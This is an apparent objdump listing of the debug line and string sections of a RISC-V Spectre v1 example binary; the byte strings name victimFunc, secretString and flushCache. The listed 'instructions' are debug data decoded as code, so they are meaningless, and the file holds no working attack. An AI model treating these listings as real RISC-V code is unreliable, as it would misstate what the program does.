    19ec:	0309                	addi	t1,t1,2
    19ee:	000a0903          	lb	s2,0(s4)
    19f2:	0301                	addi	t1,t1,0
    19f4:	0901                	addi	s2,s2,0
    19f6:	0002                	c.slli	zero,0x0
    19f8:	0501                	addi	a0,a0,0
    19fa:	0310                	addi	a2,sp,384
    19fc:	0901                	addi	s2,s2,0
    19fe:	0010                	0x10
    1a00:	0501                	addi	a0,a0,0
    1a02:	030c                	addi	a1,sp,384
    1a04:	0900                	addi	s0,sp,144
    1a06:	000c                	0xc
    1a08:	0501                	addi	a0,a0,0
    1a0a:	09000313          	li	t1,144
    1a0e:	0006                	c.slli	zero,0x1
    1a10:	0501                	addi	a0,a0,0
    1a12:	0309                	addi	t1,t1,2
    1a14:	0900                	addi	s0,sp,144
    1a16:	0008                	0x8
    1a18:	0501                	addi	a0,a0,0
    1a1a:	030a                	slli	t1,t1,0x2
    1a1c:	097e                	slli	s2,s2,0x1f
    1a1e:	000a                	c.slli	zero,0x2
    1a20:	0501                	addi	a0,a0,0
    1a22:	0309                	addi	t1,t1,2
    1a24:	0900                	addi	s0,sp,144
    1a26:	0008                	0x8
    1a28:	0501                	addi	a0,a0,0
    1a2a:	0316                	slli	t1,t1,0x5
    1a2c:	0905                	addi	s2,s2,1
    1a2e:	0002                	c.slli	zero,0x0
    1a30:	0001                	nop
    1a32:	0402                	slli	s0,s0,0x0
    1a34:	0601                	addi	a2,a2,0
    1a36:	08090003          	lb	zero,128(s2)
    1a3a:	0100                	addi	s0,sp,128
    1a3c:	0200                	addi	s0,sp,256
    1a3e:	0204                	addi	s1,sp,256
    1a40:	0a090003          	lb	zero,160(s2)
    1a44:	0100                	addi	s0,sp,128
    1a46:	0105                	addi	sp,sp,1
    1a48:	0200                	addi	s0,sp,256
    1a4a:	0504                	addi	s1,sp,640
    1a4c:	0306                	slli	t1,t1,0x1
    1a4e:	0901                	addi	s2,s2,0
    1a50:	0004                	0x4
    1a52:	0901                	addi	s2,s2,0
    1a54:	0008                	0x8
    1a56:	0100                	addi	s0,sp,128
    1a58:	01              	地址 0x0000000000001a58 越界。


Disassembly of section .debug_str:

0000000000000000 <.debug_str>:
   0:	2f637273          	csrrci	tp,0x2f6,6
   4:	63657073          	csrci	0x636,10
   8:	7274                	ld	a3,224(a2)
   a:	2d65                	addiw	s10,s10,25
   c:	3176                	fld	ft2,376(sp)
   e:	632e                	ld	t1,200(sp)
  10:	7500                	ld	s0,40(a0)
  12:	756e                	ld	a0,248(sp)
  14:	31646573          	csrrsi	a0,0x316,8
  18:	6100                	ld	s0,0(a0)
  1a:	6b74                	ld	a3,208(a4)
  1c:	6f52                	ld	t5,272(sp)
  1e:	6e75                	lui	t3,0x1d
  20:	0064                	addi	s1,sp,12
  22:	725f 6e61 3464      	0x34646e61725f
  28:	0038                	addi	a4,sp,8
  2a:	655f 656d 6772      	0x6772656d655f
  30:	6e65                	lui	t3,0x19
  32:	5f007963          	bleu	a6,zero,624 <_tbss_end+0x5a0>
  36:	755f 6e69 3874      	0x38746e69755f
  3c:	745f 7300 7465      	0x74657300745f
  42:	7366664f          	fnmadd.d	fa2,fa2,fs6,fa4,unknown
  46:	7465                	lui	s0,0xffff9
  48:	7000                	ld	s0,32(s0)
  4a:	7361                	lui	t1,0xffff8
  4c:	496e4973          	0x496e4973
  50:	7864                	ld	s1,240(s0)
  52:	5f00                	lw	s0,56(a4)
  54:	74726377          	0x74726377
  58:	5f626d6f          	jal	s10,2664e <_tbss_end+0x265ca>
  5c:	74617473          	csrrci	s0,0x746,2
  60:	0065                	c.nop	25
  62:	775f 7363 7472      	0x74727363775f
  68:	73626d6f          	jal	s10,2679e <_tbss_end+0x2671a>
  6c:	735f 6174 6574      	0x65746174735f
  72:	6c00                	ld	s0,24(s0)
  74:	20676e6f          	jal	t3,7627a <_tbss_end+0x761f6>
  78:	6f6c                	ld	a1,216(a4)
  7a:	676e                	ld	a4,216(sp)
  7c:	7520                	ld	s0,104(a0)
  7e:	736e                	ld	t1,248(sp)
  80:	6769                	lui	a4,0x1a
  82:	656e                	ld	a0,216(sp)
  84:	2064                	fld	fs1,192(s0)
  86:	6e69                	lui	t3,0x1a
  88:	0074                	addi	a3,sp,12
  8a:	6c5f 6662 6973      	0x697366626c5f
  90:	657a                	ld	a0,408(sp)
  92:	6100                	ld	s0,0(a0)
  94:	6464                	ld	s1,200(s0)
  96:	0072                	c.slli	zero,0x1c
  98:	5f5f 6e69 3674      	0x36746e695f5f
  9e:	5f34                	lw	a3,120(a4)
  a0:	0074                	addi	a3,sp,12
  a2:	5f5f 6f6c 6163      	0x61636f6c5f5f
  a8:	656c                	ld	a1,200(a0)
  aa:	745f 6800 7469      	0x74696800745f
  b0:	7241                	lui	tp,0xffff0
  b2:	6172                	ld	sp,280(sp)
  b4:	0079                	c.nop	30
  b6:	6d5f 7262 6f74      	0x6f7472626d5f
  bc:	735f6377          	0x735f6377
  c0:	6174                	ld	a3,192(a0)
  c2:	6574                	ld	a3,200(a0)
  c4:	7200                	ld	s0,32(a2)
  c6:	6e61                	lui	t3,0x18
  c8:	4964                	lw	s1,84(a0)
  ca:	7864                	ld	s1,240(s0)
  cc:	5f00                	lw	s0,56(a4)
  ce:	6f746377          	0x6f746377
  d2:	626d                	lui	tp,0x1b
  d4:	735f 6174 6574      	0x65746174735f
  da:	5f00                	lw	s0,56(a4)
  dc:	745f 5f6d 6573      	0x65735f6d745f
  e2:	61770063          	beq	a4,s7,6e2 <_tbss_end+0x65e>
  e6:	4f79                	li	t5,30
  e8:	6666                	ld	a2,88(sp)
  ea:	00746573          	csrrsi	a0,0x7,8
  ee:	6f6c                	ld	a1,216(a4)
  f0:	676e                	ld	a4,216(sp)
  f2:	6c20                	ld	s0,88(s0)
  f4:	20676e6f          	jal	t3,762fa <_tbss_end+0x76276>
  f8:	6e69                	lui	t3,0x1a
  fa:	0074                	addi	a3,sp,12
  fc:	755f 7562 0066      	0x667562755f
 102:	625f 7361 0065      	0x657361625f
 108:	7564                	ld	s1,232(a0)
 10a:	6d6d                	lui	s10,0x1b
 10c:	0079                	c.nop	30
 10e:	5f5f 6d74 685f      	0x685f6d745f5f
 114:	0072756f          	jal	a0,2791a <_tbss_end+0x27896>
 118:	5f5f 6673 5f00      	0x5f0066735f5f
 11e:	655f6e6f          	jal	t3,f6f72 <_tbss_end+0xf6eee>
 122:	6978                	ld	a4,208(a0)
 124:	5f74                	lw	a3,124(a4)
 126:	7261                	lui	tp,0xffff8
 128:	61007367          	0x61007367
 12c:	7474                	ld	a3,232(s0)
 12e:	6361                	lui	t1,0x18
 130:	7864496b          	0x7864496b
 134:	5f00                	lw	s0,56(a4)
 136:	6b6f6f63          	bltu	t5,s6,7f4 <_tbss_end+0x770>
 13a:	6569                	lui	a0,0x1a
 13c:	5f00                	lw	s0,56(a4)
 13e:	735f 6c67 6575      	0x65756c67735f
 144:	5f00                	lw	s0,56(a4)
 146:	6c66                	ld	s8,88(sp)
 148:	6761                	lui	a4,0x18
 14a:	695f0073          	0x695f0073
 14e:	78635f73          	csrrwi	t5,0x786,6
 152:	0061                	c.nop	24
 154:	735f 6474 6e69      	0x6e696474735f
 15a:	6f00                	ld	s0,24(a4)
 15c:	7475                	lui	s0,0xffffd
 15e:	6156                	ld	sp,336(sp)
 160:	416c                	lw	a1,68(a0)
 162:	7272                	ld	tp,312(sp)
 164:	7961                	lui	s2,0xffff8
 166:	5f00                	lw	s0,56(a4)
 168:	6c62                	ld	s8,24(sp)
 16a:	7a69736b          	0x7a69736b
 16e:	0065                	c.nop	25
 170:	635f 7476 7562      	0x75627476635f
 176:	0066                	c.slli	zero,0x19
 178:	6f5f 6666 6573      	0x657366666f5f
 17e:	0074                	addi	a3,sp,12
 180:	6d5f 7362 7472      	0x747273626d5f
 186:	7363776f          	jal	a4,378bc <_tbss_end+0x37838>
 18a:	735f 6174 6574      	0x65746174735f
 190:	5f00                	lw	s0,56(a4)
 192:	626d                	lui	tp,0x1b
 194:	6c72                	ld	s8,280(sp)
 196:	6e65                	lui	t3,0x19
 198:	735f 6174 6574      	0x65746174735f
 19e:	5f00                	lw	s0,56(a4)
 1a0:	6e66                	ld	t3,88(sp)
 1a2:	7261                	lui	tp,0xffff8
 1a4:	5f007367          	0x5f007367
 1a8:	6e66                	ld	t3,88(sp)
 1aa:	735f0073          	0x735f0073
 1ae:	6769                	lui	a4,0x1a
 1b0:	006e                	c.slli	zero,0x1b
 1b2:	5f5f 6d74 0070      	0x706d745f5f
 1b8:	665f 6f6c 6b63      	0x6b636f6c665f
 1be:	745f 5f00 7473      	0x74735f00745f
 1c4:	6564                	ld	s1,200(a0)
 1c6:	7272                	ld	tp,312(sp)
 1c8:	5f00                	lw	s0,56(a4)
 1ca:	6942                	ld	s2,16(sp)
 1cc:	746e6967          	0x746e6967
 1d0:	5f00                	lw	s0,56(a4)
 1d2:	6d6d6167          	0x6d6d6167
 1d6:	5f61                	li	t5,-8
 1d8:	6e676973          	csrrsi	s2,0x6e6,14
 1dc:	006d6167          	0x6d6167
 1e0:	725f 6165 0064      	0x646165725f
 1e6:	725f 7365 6c75      	0x6c757365725f
 1ec:	5f74                	lw	a3,124(a4)
 1ee:	5f5f006b          	0x5f5f006b
 1f2:	6d74                	ld	a3,216(a0)
 1f4:	6900                	ld	s0,16(a0)
 1f6:	416e                	lw	sp,216(sp)
 1f8:	7272                	ld	tp,312(sp)
 1fa:	7961                	lui	s2,0xffff8
 1fc:	657a6953          	0x657a6953
 200:	5f00                	lw	s0,56(a4)
 202:	775f 6863 0062      	0x626863775f
 208:	735f 6474 756f      	0x756f6474735f
 20e:	0074                	addi	a3,sp,12
 210:	635f 7476 656c      	0x656c7476635f
 216:	006e                	c.slli	zero,0x1b
 218:	6e69                	lui	t3,0x1a
 21a:	7241                	lui	tp,0xffff0
 21c:	6172                	ld	sp,280(sp)
 21e:	0079                	c.nop	30
 220:	645f 6f73 685f      	0x685f6f73645f
 226:	6e61                	lui	t3,0x18
 228:	6c64                	ld	s1,216(s0)
 22a:	0065                	c.nop	25
 22c:	6e5f 6f69 7362      	0x73626f696e5f
 232:	7300                	ld	s0,32(a4)
 234:	6f68                	ld	a0,216(a4)
 236:	7472                	ld	s0,312(sp)
 238:	7520                	ld	s0,104(a0)
 23a:	736e                	ld	t1,248(sp)
 23c:	6769                	lui	a4,0x1a
 23e:	656e                	ld	a0,216(sp)
 240:	2064                	fld	fs1,192(s0)
 242:	6e69                	lui	t3,0x1a
 244:	0074                	addi	a3,sp,12
 246:	615f 6574 6978      	0x69786574615f
 24c:	3074                	fld	fa3,224(s0)
 24e:	6600                	ld	s0,8(a2)
 250:	756c                	ld	a1,232(a0)
 252:	61436873          	csrrsi	a6,0x614,6
 256:	00656863          	bltu	a0,t1,266 <_tbss_end+0x1e2>
 25a:	735f 6769 616e      	0x616e6769735f
 260:	5f6c                	lw	a1,124(a4)
 262:	7562                	ld	a0,56(sp)
 264:	0066                	c.slli	zero,0x19
 266:	615f 6373 6974      	0x69746373615f
 26c:	656d                	lui	a0,0x1b
 26e:	625f 6675 5f00      	0x5f006675625f
 274:	6572                	ld	a0,280(sp)
 276:	746c7573          	csrrci	a0,0x746,24
 27a:	5f00                	lw	s0,56(a4)
 27c:	775f 6863 7700      	0x77006863775f
 282:	6e69                	lui	t3,0x1a
 284:	5f74                	lw	a3,124(a4)
 286:	0074                	addi	a3,sp,12
 288:	6c5f 636f 006b      	0x6b636f6c5f
 28e:	665f 616c 7367      	0x7367616c665f
 294:	0032                	c.slli	zero,0xc
 296:	6976                	ld	s2,344(sp)
 298:	6d697463          	bleu	s6,s2,960 <_tbss_end+0x8dc>
 29c:	7546                	ld	a0,112(sp)
 29e:	636e                	ld	t1,216(sp)
 2a0:	5f00                	lw	s0,56(a4)
 2a2:	74697277          	0x74697277
 2a6:	0065                	c.nop	25
 2a8:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
 2ac:	20313143          	fmadd.s	ft2,ft2,ft3,ft4,rup
 2b0:	2e322e37          	lui	t3,0x2e322
 2b4:	2030                	fld	fa2,64(s0)
 2b6:	6d2d                	lui	s10,0xb
 2b8:	646f6d63          	bltu	t5,t1,912 <_tbss_end+0x88e>
 2bc:	6c65                	lui	s8,0x19
 2be:	6d3d                	lui	s10,0xf
 2c0:	6465                	lui	s0,0x19
 2c2:	6e61                	lui	t3,0x18
 2c4:	2079                	0x2079
 2c6:	6d2d                	lui	s10,0xb
 2c8:	7261                	lui	tp,0xffff8
 2ca:	723d6863          	bltu	s10,gp,9fa <_tbss_end+0x976>
 2ce:	3676                	fld	fa2,376(sp)
 2d0:	6934                	ld	a3,80(a0)
 2d2:	616d                	addi	sp,sp,240
 2d4:	6466                	ld	s0,88(sp)
 2d6:	6d2d2063          	0x6d2d2063
 2da:	6261                	lui	tp,0x18
 2dc:	3d69                	addiw	s10,s10,-6
 2de:	706c                	ld	a1,224(s0)
 2e0:	3436                	fld	fs0,360(sp)
 2e2:	2064                	fld	fs1,192(s0)
 2e4:	672d                	lui	a4,0xb
 2e6:	2d20                	fld	fs0,88(a0)
 2e8:	2d20304f          	0x2d20304f
 2ec:	6e66                	ld	t3,88(sp)
 2ee:	6f632d6f          	jal	s10,329e4 <_tbss_end+0x32960>
 2f2:	6d6d                	lui	s10,0x1b
 2f4:	2d206e6f          	jal	t3,65c6 <_tbss_end+0x6542>
 2f8:	6e66                	ld	t3,88(sp)
 2fa:	75622d6f          	jal	s10,22a50 <_tbss_end+0x229cc>
 2fe:	6c69                	lui	s8,0x1a
 300:	6974                	ld	a3,208(a0)
 302:	2d6e                	fld	fs10,216(sp)
 304:	7270                	ld	a2,224(a2)
 306:	6e69                	lui	t3,0x1a
 308:	6674                	ld	a3,200(a2)
 30a:	7500                	ld	s0,40(a0)
 30c:	756e                	ld	a0,248(sp)
 30e:	32646573          	csrrsi	a0,mhpmevent6,8
 312:	6f00                	ld	s0,24(a4)
 314:	7475                	lui	s0,0xffffd
 316:	7570                	ld	a2,232(a0)
 318:	0074                	addi	a3,sp,12
 31a:	6e5f 616d 6c6c      	0x6c6c616d6e5f
 320:	7400636f          	jal	t1,6a60 <_tbss_end+0x69dc>
 324:	7754706f          	j	48298 <_tbss_end+0x48214>
 328:	7864496f          	jal	s2,44aae <_tbss_end+0x44a2a>
 32c:	6c00                	ld	s0,24(s0)
 32e:	20676e6f          	jal	t3,76534 <_tbss_end+0x764b0>
 332:	6f64                	ld	s1,216(a4)
 334:	6275                	lui	tp,0x1d
 336:	656c                	ld	a1,200(a0)
 338:	5f00                	lw	s0,56(a4)
 33a:	656e                	ld	a0,216(sp)
 33c:	7478                	ld	a4,232(s0)
 33e:	0066                	c.slli	zero,0x19
 340:	72636573          	csrrsi	a0,0x726,6
 344:	7465                	lui	s0,0xffff9
 346:	69727453          	0x69727453
 34a:	676e                	ld	a4,216(sp)
 34c:	5f00                	lw	s0,56(a4)
 34e:	745f 5f6d 6f6d      	0x6f6d5f6d745f
 354:	006e                	c.slli	zero,0x1b
 356:	615f 6574 6978      	0x69786574615f
 35c:	0074                	addi	a3,sp,12
 35e:	6f627573          	csrrci	a0,0x6f6,4
 362:	7470                	ld	a2,232(s0)
 364:	7261                	lui	tp,0xffff8
 366:	5f5f0067          	jr	1525(t5)
 36a:	64696473          	csrrsi	s0,0x646,18
 36e:	6e69                	lui	t3,0x1a
 370:	7469                	lui	s0,0xffffa
 372:	5f00                	lw	s0,56(a4)
 374:	5f66666f          	jal	a2,6696a <_tbss_end+0x668e6>
 378:	0074                	addi	a3,sp,12
 37a:	7261                	lui	tp,0xffff8
 37c:	6172                	ld	sp,280(sp)
 37e:	3179                	addiw	sp,sp,-2
 380:	6100                	ld	s0,0(a0)
 382:	7272                	ld	tp,312(sp)
 384:	7961                	lui	s2,0xffff8
 386:	0032                	c.slli	zero,0xc
 388:	5f5f 6975 746e      	0x746e69755f5f
 38e:	3436                	fld	fs0,360(sp)
 390:	745f 7500 5469      	0x54697500745f
 396:	6d65                	lui	s10,0x19
 398:	0070                	addi	a2,sp,12
 39a:	665f 6572 6c65      	0x6c656572665f
 3a0:	7369                	lui	t1,0xffffa
 3a2:	0074                	addi	a3,sp,12
 3a4:	4c5f 434f 5f4b      	0x5f4b434f4c5f
 3aa:	4552                	lw	a0,20(sp)
 3ac:	53525543          	fmadd.d	fa0,ft4,fs5,fa0,unknown
 3b0:	5649                	li	a2,-14
 3b2:	5f45                	li	t5,-15
 3b4:	0054                	addi	a3,sp,4
 3b6:	756e                	ld	a0,248(sp)
 3b8:	536d                	li	t1,-5
 3ba:	7465                	lui	s0,0xffff9
 3bc:	656c4373          	0x656c4373
 3c0:	7261                	lui	tp,0xffff8
 3c2:	7500                	ld	s0,40(a0)
 3c4:	736e                	ld	t1,248(sp)
 3c6:	6769                	lui	a4,0x1a
 3c8:	656e                	ld	a0,216(sp)
 3ca:	2064                	fld	fs1,192(s0)
 3cc:	72616863          	bltu	sp,t1,afc <_tbss_end+0xa78>
 3d0:	6400                	ld	s0,8(s0)
 3d2:	6d75                	lui	s10,0x1d
 3d4:	796d                	lui	s2,0xffffb
 3d6:	654d                	lui	a0,0x13
 3d8:	006d                	c.nop	27
 3da:	6e5f 7765 5f00      	0x5f0077656e5f
 3e0:	5f68                	lw	a0,124(a4)
 3e2:	7265                	lui	tp,0xffff9
 3e4:	6e72                	ld	t3,280(sp)
 3e6:	6873006f          	j	3126c <_tbss_end+0x311e8>
 3ea:	2074726f          	jal	tp,47df0 <_tbss_end+0x47d6c>
 3ee:	6e69                	lui	t3,0x1a
 3f0:	0074                	addi	a3,sp,12
 3f2:	5f5f 6d74 795f      	0x795f6d745f5f
 3f8:	6164                	ld	s1,192(a0)
 3fa:	0079                	c.nop	30
 3fc:	5f5f 6273 6675      	0x667562735f5f
 402:	5f00                	lw	s0,56(a4)
 404:	6f69                	lui	t5,0x1a
 406:	7362                	ld	t1,56(sp)
 408:	5f00                	lw	s0,56(a4)
 40a:	465f 4c49 0045      	0x454c49465f
 410:	6d5f 7362 6174      	0x617473626d5f
 416:	6574                	ld	a3,200(a0)
 418:	745f 5f00 735f      	0x735f5f00745f
 41e:	4946                	lw	s2,80(sp)
 420:	454c                	lw	a1,12(a0)
 422:	5f00                	lw	s0,56(a4)
 424:	626d                	lui	tp,0x1b
 426:	74617473          	csrrci	s0,0x746,2
 42a:	0065                	c.nop	25
 42c:	725f 6e61 5f64      	0x5f646e61725f
 432:	656e                	ld	a0,216(sp)
 434:	7478                	ld	a4,232(s0)
 436:	5f00                	lw	s0,56(a4)
 438:	626d                	lui	tp,0x1b
 43a:	656c                	ld	a1,200(a0)
 43c:	5f6e                	lw	t5,248(sp)
 43e:	74617473          	csrrci	s0,0x746,2
 442:	0065                	c.nop	25
 444:	695f 636e 5f00      	0x5f00636e695f
 44a:	6e69                	lui	t3,0x1a
 44c:	0064                	addi	s1,sp,12
 44e:	6c5f 636f 6c61      	0x6c61636f6c5f
 454:	0065                	c.nop	25
 456:	5f5f 6c63 6165      	0x61656c635f5f
 45c:	756e                	ld	a0,248(sp)
 45e:	0070                	addi	a2,sp,12
 460:	755f 736e 6570      	0x6570736e755f
 466:	69666963          	bltu	a2,s6,af8 <_tbss_end+0xa74>
 46a:	6465                	lui	s0,0x19
 46c:	6c5f 636f 6c61      	0x6c61636f6c5f
 472:	5f65                	li	t5,-7
 474:	6e69                	lui	t3,0x1a
 476:	6f66                	ld	t5,88(sp)
 478:	5f00                	lw	s0,56(a4)
 47a:	616d                	addi	sp,sp,240
 47c:	7778                	ld	a4,232(a4)
 47e:	7364                	ld	s1,224(a4)
 480:	5f00                	lw	s0,56(a4)
 482:	6572                	ld	a0,280(sp)
 484:	6e65                	lui	t3,0x19
 486:	0074                	addi	a3,sp,12
 488:	735f 6565 0064      	0x646565735f
 48e:	5f5f 6f63 6e75      	0x6e756f635f5f
 494:	0074                	addi	a3,sp,12
 496:	5f5f 6176 756c      	0x756c61765f5f
 49c:	0065                	c.nop	25
 49e:	735f 6565 006b      	0x6b6565735f
 4a4:	6d6f682f          	0x6d6f682f
 4a8:	2f65                	addiw	t5,t5,25
 4aa:	6e656863          	bltu	a0,t1,b9a <_tbss_end+0xb16>
 4ae:	61697867          	0x61697867
 4b2:	2f75796f          	jal	s2,57fa8 <_tbss_end+0x57f24>
 4b6:	63657053          	0x63657053
 4ba:	464c                	lw	a1,12(a2)
 4bc:	2f42                	fld	ft10,16(sp)
 4be:	7461                	lui	s0,0xffff8
 4c0:	6174                	ld	a3,192(a0)
 4c2:	655f6b63          	bltu	t5,s5,b18 <_tbss_end+0xa94>
 4c6:	6578                	ld	a4,200(a0)
 4c8:	706d                	c.lui	zero,0xffffb
 4ca:	656c                	ld	a1,200(a0)
 4cc:	725f 7369 7663      	0x76637369725f
 4d2:	5f00                	lw	s0,56(a4)
 4d4:	7066                	0x7066
 4d6:	745f736f          	jal	t1,f841a <_tbss_end+0xf8396>
 4da:	5f00                	lw	s0,56(a4)
 4dc:	745f 5f6d 6579      	0x65795f6d745f
 4e2:	7261                	lui	tp,0xffff8
 4e4:	5f00                	lw	s0,56(a4)
 4e6:	745f 5f6d 696d      	0x696d5f6d745f
 4ec:	006e                	c.slli	zero,0x1b
 4ee:	78644963          	blt	s0,t1,c80 <_tbss_end+0xbfc>
 4f2:	6f00                	ld	s0,24(a4)
 4f4:	7475                	lui	s0,0xffffd
 4f6:	6449                	lui	s0,0x12
 4f8:	4178                	lw	a4,68(a0)
 4fa:	7272                	ld	tp,312(sp)
 4fc:	7961                	lui	s2,0xffff8
 4fe:	5f00                	lw	s0,56(a4)
 500:	756d                	lui	a0,0xffffb
 502:	746c                	ld	a1,232(s0)
 504:	5f00                	lw	s0,56(a4)
 506:	74727473          	csrrci	s0,0x747,4
 50a:	6c5f6b6f          	jal	s6,f73ce <_tbss_end+0xf734a>
 50e:	7361                	lui	t1,0xffff8
 510:	0074                	addi	a3,sp,12
 512:	6964                	ld	s1,208(a0)
 514:	6666                	ld	a2,88(sp)
 516:	5f00                	lw	s0,56(a4)
 518:	6e66                	ld	t3,88(sp)
 51a:	7974                	ld	a3,240(a0)
 51c:	6570                	ld	a2,200(a0)
 51e:	615f0073          	0x615f0073
 522:	6464                	ld	s1,200(s0)
 524:	5f00                	lw	s0,56(a4)
 526:	555f 6f4c 676e      	0x676e6f4c555f
 52c:	5f00                	lw	s0,56(a4)
 52e:	64746567          	0x64746567
 532:	7461                	lui	s0,0xffff8
 534:	5f65                	li	t5,-7
 536:	7265                	lui	tp,0xffff9
 538:	0072                	c.slli	zero,0x1c
 53a:	675f 6f6c 6162      	0x61626f6c675f
 540:	5f6c                	lw	a1,124(a4)
 542:	6d69                	lui	s10,0x1a
 544:	7570                	ld	a2,232(a0)
 546:	6572                	ld	a0,280(sp)
 548:	705f 7274 6100      	0x61007274705f
 54e:	696c                	ld	a1,208(a0)
 550:	64656e67          	0x64656e67
 554:	654d                	lui	a0,0x13
 556:	006d                	c.nop	27
 558:	755f 756e 6573      	0x6573756e755f
 55e:	5f64                	lw	s1,124(a4)
 560:	6172                	ld	sp,280(sp)
 562:	646e                	ld	s0,216(sp)
 564:	5f00                	lw	s0,56(a4)
 566:	6966                	ld	s2,88(sp)
 568:	656c                	ld	a1,200(a0)
 56a:	5f00                	lw	s0,56(a4)
 56c:	00736477          	0x736477
 570:	5f5f 6d74 775f      	0x775f6d745f5f
 576:	6164                	ld	s1,192(a0)
 578:	0079                	c.nop	30
 57a:	675f 756c 0065      	0x65756c675f
 580:	735f 6973 657a      	0x657a6973735f
 586:	745f 5f00 366c      	0x366c5f00745f
 58c:	6134                	ld	a3,64(a0)
 58e:	625f 6675 5f00      	0x5f006675625f
 594:	5f676973          	csrrsi	s2,0x5f6,14
 598:	7566                	ld	a0,120(sp)
 59a:	636e                	ld	t1,216(sp)
 59c:	5f00                	lw	s0,56(a4)
 59e:	626e                	ld	tp,216(sp)
 5a0:	6675                	lui	a2,0x1d
 5a2:	5f00                	lw	s0,56(a4)
 5a4:	6e75                	lui	t3,0x1d
 5a6:	7375                	lui	t1,0xffffd
 5a8:	6465                	lui	s0,0x19
 5aa:	5f00                	lw	s0,56(a4)
 5ac:	745f 5f6d 7369      	0x73695f6d745f
 5b2:	7364                	ld	s1,224(a4)
 5b4:	0074                	addi	a3,sp,12
 5b6:	6c5f 636f 6c61      	0x6c61636f6c5f
 5bc:	6974                	ld	a3,208(a0)
 5be:	656d                	lui	a0,0x1b
 5c0:	625f 6675 5f00      	0x5f006675625f
 5c6:	736f6c63          	bltu	t5,s6,cfe <_tbss_end+0xc7a>
 5ca:	0065                	c.nop	25
 5cc:	725f 3834 7300      	0x73003834725f
 5d2:	6174                	ld	a3,192(a0)
 5d4:	7472                	ld	s0,312(sp)
 5d6:	5f00                	lw	s0,56(a4)
 5d8:	626d                	lui	tp,0x1b
 5da:	6f74                	ld	a3,216(a4)
 5dc:	735f6377          	0x735f6377
 5e0:	6174                	ld	a3,192(a0)
 5e2:	6574                	ld	a3,200(a0)
 5e4:	7200                	ld	s0,32(a2)
 5e6:	7365                	lui	t1,0xffff9
 5e8:	6c75                	lui	s8,0x1d
 5ea:	7374                	ld	a3,224(a4)
 5ec:	5f00                	lw	s0,56(a4)
 5ee:	3570                	fld	fa2,232(a0)
 5f0:	72610073          	0x72610073
 5f4:	6172                	ld	sp,280(sp)
 5f6:	3179                	addiw	sp,sp,-2
 5f8:	735f 007a 616d      	0x616d007a735f
 5fe:	6e69                	lui	t3,0x1a
 600:	5f00                	lw	s0,56(a4)
 602:	745f 5f6d 646d      	0x646d5f6d745f
 608:	7961                	lui	s2,0xffff8
 60a:	7300                	ld	s0,32(a4)
 60c:	6372                	ld	t1,280(sp)
 60e:	7472632f          	0x7472632f
 612:	532e                	lw	t1,232(sp)
 614:	2f00                	fld	fs0,24(a4)
 616:	6f68                	ld	a0,216(a4)
 618:	656d                	lui	a0,0x1b
 61a:	6568632f          	0x6568632f
 61e:	676e                	ld	a4,216(sp)
 620:	6978                	ld	a4,208(a0)
 622:	6f61                	lui	t5,0x18
 624:	7579                	lui	a0,0xffffe
 626:	6570532f          	0x6570532f
 62a:	42464c63          	blt	a2,tp,a62 <_tbss_end+0x9de>
 62e:	7474612f          	0x7474612f
 632:	6361                	lui	t1,0x18
 634:	7865206b          	0x7865206b
 638:	6d65                	lui	s10,0x19
 63a:	6c70                	ld	a2,216(s0)
 63c:	0065                	c.nop	25
 63e:	20554e47          	fmsub.s	ft8,fa0,ft5,ft4,rmm
 642:	5341                	li	t1,-16
 644:	3220                	fld	fs0,96(a2)
 646:	322e                	fld	ft4,232(sp)
 648:	0039                	c.nop	14
 64a:	2f637273          	csrrci	tp,0x2f6,6
 64e:	63617473          	csrrci	s0,0x636,2
 652:	00532e6b          	0x532e6b
 656:	616e                	ld	sp,216(sp)
 658:	656d                	lui	a0,0x1b
 65a:	5f00                	lw	s0,56(a4)
 65c:	6c74                	ld	a3,216(s0)
 65e:	61645f73          	csrrwi	t5,0x616,8
 662:	6174                	ld	a3,192(a0)
 664:	7300                	ld	s0,32(a4)
 666:	7274                	ld	a3,224(a2)
 668:	656c                	ld	a1,200(a0)
 66a:	006e                	c.slli	zero,0x1b
 66c:	7270                	ld	a2,224(a2)
 66e:	6e69                	lui	t3,0x1a
 670:	4174                	lw	a3,68(a0)
 672:	7272                	ld	tp,312(sp)
 674:	7961                	lui	s2,0xffff8
 676:	6300                	ld	s0,0(a4)
 678:	7561                	lui	a0,0xffff8
 67a:	73006573          	csrrsi	a0,0x730,0
 67e:	7274                	ld	a3,224(a2)
 680:	6c6e                	ld	s8,216(sp)
 682:	6e65                	lui	t3,0x19
 684:	7000                	ld	s0,32(s0)
 686:	6f72                	ld	t5,280(sp)
 688:	73736563          	bltu	t1,s7,db2 <_tbss_end+0xd2e>
 68c:	705f 6572 6963      	0x69636572705f
 692:	6e6f6973          	csrrsi	s2,0x6e6,30
 696:	7400                	ld	s0,40(s0)
 698:	6164                	ld	s1,192(a0)
 69a:	6174                	ld	a3,192(a0)
 69c:	735f 7a69 0065      	0x657a69735f
 6a2:	745f 6164 6174      	0x61746164745f
 6a8:	655f 646e 6700      	0x6700646e655f
 6ae:	7465                	lui	s0,0xffff9
 6b0:	6975                	lui	s2,0x1d
 6b2:	746e                	ld	s0,248(sp)
 6b4:	7000                	ld	s0,32(s0)
 6b6:	7475                	lui	s0,0xffffd
 6b8:	72616863          	bltu	sp,t1,de8 <_tbss_end+0xd64>
 6bc:	7200                	ld	s0,32(a2)
 6be:	6765                	lui	a4,0x19
 6c0:	72700073          	0x72700073
 6c4:	6e69                	lui	t3,0x1a
 6c6:	7374                	ld	a3,224(a4)
 6c8:	7274                	ld	a3,224(a2)
 6ca:	6200                	ld	s0,0(a2)
 6cc:	7261                	lui	tp,0xffff8
 6ce:	6972                	ld	s2,280(sp)
 6d0:	7265                	lui	tp,0xffff9
 6d2:	6800                	ld	s0,16(s0)
 6d4:	6e61                	lui	t3,0x18
 6d6:	6c64                	ld	s1,216(s0)
 6d8:	5f65                	li	t5,-7
 6da:	7274                	ld	a3,224(a2)
 6dc:	7061                	c.lui	zero,0xffff8
 6de:	7400                	ld	s0,40(s0)
 6e0:	7268                	ld	a0,224(a2)
 6e2:	6165                	addi	sp,sp,112
 6e4:	5f64                	lw	s1,124(a4)
 6e6:	6e65                	lui	t3,0x19
 6e8:	7274                	ld	a3,224(a2)
 6ea:	0079                	c.nop	30
 6ec:	63727473          	csrrci	s0,0x637,4
 6f0:	7970                	ld	a2,240(a0)
 6f2:	7000                	ld	s0,32(s0)
 6f4:	6972                	ld	s2,280(sp)
 6f6:	746e                	ld	s0,248(sp)
 6f8:	756e                	ld	a0,248(sp)
